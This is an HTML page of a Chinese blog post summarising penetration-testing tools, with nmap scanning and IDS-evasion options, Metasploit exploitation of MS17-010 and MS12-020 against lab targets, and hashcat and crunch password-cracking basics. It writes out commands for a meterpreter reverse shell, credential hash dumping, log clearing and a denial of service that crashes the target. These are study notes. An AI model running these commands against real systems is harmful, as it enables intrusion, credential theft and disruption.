@@ -1,0 +1,801 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="JiAshi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="渗透工具总结nmap全面扫描1$ nmap  -A -T 4 -v targetIPAddress  主机发现1.局域网内ping扫描 12$ nmap -sP 192.168.86.1-254$ nmap -sP 192.168.86.0&#x2F;24  说明：同网段下，通过ARP包（broadcast）  2.跨网段执行ping扫描 1$ nmap -sP 192.168.109.1  说明:扫描">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透工具总结">
+<meta property="og:url" content="https://jiashi19.github.io/2023/11/23/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Blog from jiAshi19">
+<meta property="og:description" content="渗透工具总结nmap全面扫描1$ nmap  -A -T 4 -v targetIPAddress  主机发现1.局域网内ping扫描 12$ nmap -sP 192.168.86.1-254$ nmap -sP 192.168.86.0&#x2F;24  说明：同网段下，通过ARP包（broadcast）  2.跨网段执行ping扫描 1$ nmap -sP 192.168.109.1  说明:扫描">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/rGtY5FWHL2wnobu.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/3ehQIBTg7YxZ4Oo.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/fi5YylP6LuDB8Jr.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/8C6ZdNHWOY391Iq.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/G7KcEzrkam1PANH.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/YGozJWpta86Zu73.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/tzHIXaypqAf4ole.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/O91TesUXrux2QEz.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/KY9ez7JPtXVO6NM.png">
+<meta property="og:image" content="https://s2.loli.net/2023/10/30/Hao5rWfCLjv2iwF.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/3Vpob58I4uNnqRW.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/ysmRoIgKthYNaCl.png">
+<meta property="og:image" content="https://oss.edu.sangfor.com.cn/file/20231101/image231101205352945k9unn.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/xgVXziSPmtIGjM3.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/vOBG8QMwn1Fpa5f.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/16/Yd3n6kXsoPab5tu.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/01/2ChxqoKD8r54cPg.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/01/XVWPvJmwesMFG4b.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/01/vDdGWsun7ZNPayf.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/01/YyiFscIfRjKHWq6.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/02/StcUoMivYzOLQ9s.png">
+<meta property="og:image" content="https://s2.loli.net/2023/11/02/xG8P3r1XB2zWKZm.png">
+<meta property="article:published_time" content="2023-11-23T07:47:30.000Z">
+<meta property="article:modified_time" content="2024-07-21T11:16:59.145Z">
+<meta property="article:author" content="JiAshi">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/10/30/rGtY5FWHL2wnobu.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>渗透工具总结 - Blog from jiAshi19</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jiashi19.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>jiashi&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="渗透工具总结"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-23 15:47" pubdate>
+          2023年11月23日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">渗透工具总结</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <span id="more"></span>
+
+<h1 id="渗透工具总结"><a href="#渗透工具总结" class="headerlink" title="渗透工具总结"></a>渗透工具总结</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><h3 id="全面扫描"><a href="#全面扫描" class="headerlink" title="全面扫描"></a>全面扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap  -A -T 4 -v targetIPAddress<br></code></pre></td></tr></table></figure>
+
+<h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>1.局域网内ping扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sP 192.168.86.1-254<br>$ nmap -sP 192.168.86.0/24<br></code></pre></td></tr></table></figure>
+
+<p>说明：同网段下，通过ARP包（broadcast）</p>
+<p><img src="https://s2.loli.net/2023/10/30/rGtY5FWHL2wnobu.png" srcset="/img/loading.gif" lazyload alt="image-20231030164328694"></p>
+<p>2.跨网段执行ping扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sP 192.168.109.1<br></code></pre></td></tr></table></figure>
+
+<p>说明:扫描跨网段目标主机时，使用-sP或-sn选项，默认情况下Nmap会依次发送4种不同类型的数据包(ICMP echo request、TCP SYNpacket to port 443、TCP ACKpacket to port 80、ICMP timestamp request)来探测目标主机是否在线，只要收到其中一个包的回复，就证明目标机在线。</p>
+<p><img src="https://s2.loli.net/2023/10/30/3ehQIBTg7YxZ4Oo.png" srcset="/img/loading.gif" lazyload></p>
+<p>第一条：ICMP echo request 请求，包内容如下。</p>
+<p><img src="https://s2.loli.net/2023/10/30/fi5YylP6LuDB8Jr.png" srcset="/img/loading.gif" lazyload alt="image-20231030170333887"></p>
+<p>附：ICMP报文类型：</p>
+<p><img src="https://s2.loli.net/2023/10/30/8C6ZdNHWOY391Iq.png" srcset="/img/loading.gif" lazyload alt="image-20231030170939645"></p>
+<p>3.–packet-trace的使用</p>
+<p><img src="https://s2.loli.net/2023/10/30/G7KcEzrkam1PANH.png" srcset="/img/loading.gif" lazyload alt="image-20231030171159066"></p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>目标:确定目标主机的TCP&#x2F;UDP端口的开放情况<br>原理:发送TCP、UDP等类型的探测包到目标端口，根据收到的回复包判定端口是否开放</p>
+<p><strong>端口的六个状态</strong>：<br>open:端口是开放的</p>
+<p>closed:端口是关闭的</p>
+<p>filtered:端口被防火墙IDS&#x2F;IPS屏蔽，无法确定其状态</p>
+<p>unfiltered:端口没有被屏蔽，但是否开放需要进一步确定</p>
+<p>open|filtered:端口是开放的或被屏蔽</p>
+<p>closed|filtered :端口是关闭的或被屏蔽</p>
+<p><strong>端口扫描的选项</strong>：</p>
+<p><img src="https://s2.loli.net/2023/11/16/YGozJWpta86Zu73.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>使用方法说明</strong>：</p>
+<p>指定端口扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -p T:1-65535,U:1-65535 -sS -sU ipaddr<br></code></pre></td></tr></table></figure>
+
+<p>TCP-SYN（**-sS**）扫描：</p>
+<p><img src="https://s2.loli.net/2023/10/30/tzHIXaypqAf4ole.png" srcset="/img/loading.gif" lazyload alt="image-20231030180109743"></p>
+<p>TCP-connect扫描：</p>
+<p><img src="https://s2.loli.net/2023/10/30/O91TesUXrux2QEz.png" srcset="/img/loading.gif" lazyload alt="image-20231030180146550"></p>
+<p>TCP-ACK扫描：</p>
+<p><img src="https://s2.loli.net/2023/10/30/KY9ez7JPtXVO6NM.png" srcset="/img/loading.gif" lazyload alt="image-20231030180211552"></p>
+<p>隐蔽扫描：</p>
+<p><img src="https://s2.loli.net/2023/10/30/Hao5rWfCLjv2iwF.png" srcset="/img/loading.gif" lazyload alt="image-20231030180303495"></p>
+<h3 id="应用程序与版本信息侦测"><a href="#应用程序与版本信息侦测" class="headerlink" title="应用程序与版本信息侦测"></a>应用程序与版本信息侦测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sV ipAddress<br></code></pre></td></tr></table></figure>
+
+<h3 id="操作系统侦测"><a href="#操作系统侦测" class="headerlink" title="操作系统侦测"></a>操作系统侦测</h3><p>网络协议栈指纹识别</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -O 192.168.86.134 <br></code></pre></td></tr></table></figure>
+
+<h3 id="规避FW-IDS技术"><a href="#规避FW-IDS技术" class="headerlink" title="规避FW&#x2F;IDS技术"></a>规避FW&#x2F;IDS技术</h3><ol>
+<li><p>-T 控制扫描速度</p>
+</li>
+<li><p>-D 源IP欺骗</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -D RND:3 ipAddr<br></code></pre></td></tr></table></figure>
+
+<p>RND:数量</p>
+</li>
+<li><p>-sI 空闲扫描</p>
+<p>利用网络上闲置的地址</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -Pn -sI fakeAddr targetAddr<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>–spoof-mac 源MAC地址欺骗</p>
+<p>–spoof-mac 0（0表示随机）</p>
+</li>
+</ol>
+<h3 id="NSE脚本"><a href="#NSE脚本" class="headerlink" title="NSE脚本"></a>NSE脚本</h3><p>检测常见漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap --script vuln ipAddrs<br></code></pre></td></tr></table></figure>
+
+<h2 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h2><h3 id="使用exploits模块"><a href="#使用exploits模块" class="headerlink" title="使用exploits模块"></a>使用exploits模块</h3><h4 id="在Metasploit终端中输入以下命令，搜索ms17-010相关的模块"><a href="#在Metasploit终端中输入以下命令，搜索ms17-010相关的模块" class="headerlink" title="在Metasploit终端中输入以下命令，搜索ms17-010相关的模块"></a>在Metasploit终端中输入以下命令，搜索ms17-010相关的模块</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure>
+
+
+<p><img src="https://s2.loli.net/2023/11/16/3Vpob58I4uNnqRW.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="使用smb-ms17-010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞："><a href="#使用smb-ms17-010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞：" class="headerlink" title="使用smb_ms17_010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞："></a>使用smb_ms17_010模块对靶机进行漏洞检测，确认其存在ms17-010漏洞：</h4><p><img src="https://s2.loli.net/2023/11/16/ysmRoIgKthYNaCl.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://oss.edu.sangfor.com.cn/file/20231101/image231101205352945k9unn.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h4 id="利用ms17-010漏洞对靶机执行溢出攻击"><a href="#利用ms17-010漏洞对靶机执行溢出攻击" class="headerlink" title="利用ms17-010漏洞对靶机执行溢出攻击"></a>利用ms17-010漏洞对靶机执行溢出攻击</h4><p>其中设置了使用meterpreter的reverse_tcp模块。</p>
+<p>set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp    &#x2F;&#x2F;使用<strong>payload</strong>：meterpreter&#x2F;reverse_tcp<br><img src="https://s2.loli.net/2023/11/16/xgVXziSPmtIGjM3.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>看到出现了meterpreter，说明攻击成功。<br><img src="https://s2.loli.net/2023/11/16/vOBG8QMwn1Fpa5f.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>关于meterpreter的reverse_tcp使用方法:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">pwd</span>    //打印当前工作目录<br>sysinfo     // 查看系统信息<br>getuid      //获取当前权限的用户<span class="hljs-built_in">id</span><br>ps       //查看当前目标机上运行的进程列表和pid<br>getsystem      //获取system权限<br>screenshot    //截取目标主机当前屏幕<br>hashdump     //获取用户名与<span class="hljs-built_in">hash</span>口令<br>shell     //获取目标主机shell<br>upload     //上传一个文件<br>download    //下载一个文件<br>execute     //执行目标系统中的文件（-f指定文件，-i执行可交互模式，-H隐藏窗口）<br>clearev    //清除日志<br>background    //将meterpreter放入后台（使用sessions -i重新连接到会话）<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/16/Yd3n6kXsoPab5tu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h3 id="使用auxiliary模块（示例）"><a href="#使用auxiliary模块（示例）" class="headerlink" title="使用auxiliary模块（示例）"></a>使用auxiliary模块（示例）</h3><h4 id="1．启动Metasploit"><a href="#1．启动Metasploit" class="headerlink" title="1．启动Metasploit"></a>1．启动Metasploit</h4><p>（2）在终端使用如下命令，启动Metasploit终端（提示符msf&gt;）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfdb init &amp;&amp; msfconsole<br></code></pre></td></tr></table></figure>
+
+<h4 id="2．检测靶机是否存在ms12-020漏洞"><a href="#2．检测靶机是否存在ms12-020漏洞" class="headerlink" title="2．检测靶机是否存在ms12-020漏洞"></a>2．检测靶机是否存在ms12-020漏洞</h4><p>（1）在Metasploit终端下输入以下命令查找ms12-020相关的模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">search ms12-020<br></code></pre></td></tr></table></figure>
+
+<p>搜索的结果中，第一项为ms12-020漏洞利用模块，第二项为ms12-020漏洞检测模块：</p>
+<p><img src="https://s2.loli.net/2023/11/01/2ChxqoKD8r54cPg.png" srcset="/img/loading.gif" lazyload alt="image-20231101195555132"></p>
+<p>（2）分别输入以下命令，使用ms12_020_check模块对目标机进行漏洞检测，以确认目标机存在ms12-020漏洞：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use  auxiliary/scanner/rdp/ms12_020_check   //使用ms12_020_check模块<br><br>show  options   //查看该模块需要设置哪些参数<br><br><span class="hljs-built_in">set</span>  RHOSTS  [靶机IP]   //设置目标机的IP地址<br><br>run    //执行<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/01/XVWPvJmwesMFG4b.png" srcset="/img/loading.gif" lazyload alt="image-20231101195842369"></p>
+<p>检测结果显示，靶机存在ms12-020漏洞。</p>
+<h4 id="3．利用ms12-020漏洞对靶机进行攻击"><a href="#3．利用ms12-020漏洞对靶机进行攻击" class="headerlink" title="3．利用ms12-020漏洞对靶机进行攻击"></a>3．利用ms12-020漏洞对靶机进行攻击</h4><p>在Metasploit终端下分别输入以下命令，使用ms12_020_maxchannelids模块对目标机的ms12-020漏洞进行利用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">use  auxiliary/dos/windows/rdp/ms12_020_maxchannelids   //使用ms12_020_maxchannelids模块<br><br>show  options   //查看该模块需要设置哪些参数<br><br><span class="hljs-built_in">set</span>  RHOST  [靶机IP]   //设置目标机的IP地址<br><br>run   //执行<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/11/01/vDdGWsun7ZNPayf.png" srcset="/img/loading.gif" lazyload alt="image-20231101200252821"></p>
+<p>此时，靶机被攻击后出现蓝屏：</p>
+<p><img src="https://s2.loli.net/2023/11/01/YyiFscIfRjKHWq6.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p><strong>掩码（mask）使用：</strong></p>
+<p><strong>Hashcat的掩码字符集:</strong></p>
+<ul>
+<li>?l         小写字母(abcdefghijklmnopqrstuvwxyz)</li>
+<li>?u        大写字母(ABCDEFGHIJKLMNOPQRSTUVWXYZ)</li>
+<li>?d        十进制数字(0123456789)</li>
+<li>?h        十六进制数字，字母小写(0123456789abcdef)</li>
+<li>?H        十六进制数字，字母大写(0123456789ABCDEF)</li>
+<li>?s         特殊字符(!”#$%&amp;‘()*+，-.&#x2F;;&lt;&#x3D;&gt;?@[]^_&#96;{|}~)</li>
+<li>?a         相当于?l?u?d?s，即键盘上所有可见的字符</li>
+<li>?b         0x00 - 0xff</li>
+</ul>
+<p><img src="https://s2.loli.net/2023/11/02/StcUoMivYzOLQ9s.png" srcset="/img/loading.gif" lazyload alt="image-20231102102920007"></p>
+<p>使用示例：</p>
+<p><img src="https://s2.loli.net/2023/11/02/xG8P3r1XB2zWKZm.png" srcset="/img/loading.gif" lazyload alt="image-20231102105617208"></p>
+<h2 id="Crunch"><a href="#Crunch" class="headerlink" title="Crunch"></a>Crunch</h2><p>创建密码字典的工具。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string &gt;] [options]<br><span class="hljs-comment">#-t 指定密码输出结果的格式</span><br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>渗透工具总结</div>
+      <div>https://jiashi19.github.io/2023/11/23/渗透工具总结/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>JiAshi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月23日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/02/01/Environment-variable-attack/" title="Environment-variable-attack">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Environment-variable-attack</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL-injection">
+                        <span class="hidden-mobile">SQL-injection</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
